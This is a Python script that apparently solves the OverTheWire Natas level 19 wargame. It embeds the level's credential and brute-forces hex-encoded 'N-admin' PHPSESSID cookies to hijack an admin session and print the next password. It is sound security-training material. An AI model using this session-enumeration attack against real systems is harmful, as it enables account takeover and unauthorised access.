import requests

# Level configuration
URL = "http://natas19.natas.labs.overthewire.org/index.php"
AUTH = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")
MAX_ID = 640

def solve():
    print(f"[*] Starting brute force of {MAX_ID} possible admin IDs...")

    for i in range(1, MAX_ID + 1):
        session_str = f"{i}-admin"
        session_hex = session_str.encode().hex()
        cookies = {'PHPSESSID': session_hex}
        
        try:
            response = requests.get(URL, auth=AUTH, cookies=cookies)
            
            # Check if we found the password
            if "You are an admin" in response.text:
                print(f"\n[+] Success! Valid Session ID found: {session_hex} (ID: {i})")
                
                # Extract the password
                content = response.text.split("Password: ")[1].split("</pre>")[0]
                print(f"[+] Password for natas20: {content}")
                return
            
            # Progress indicator
            if i % 50 == 0:
                print(f"[*] Tried {i} IDs...")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
            break

    print("[-] Failed to find a valid admin session.")

if __name__ == "__main__":
    solve()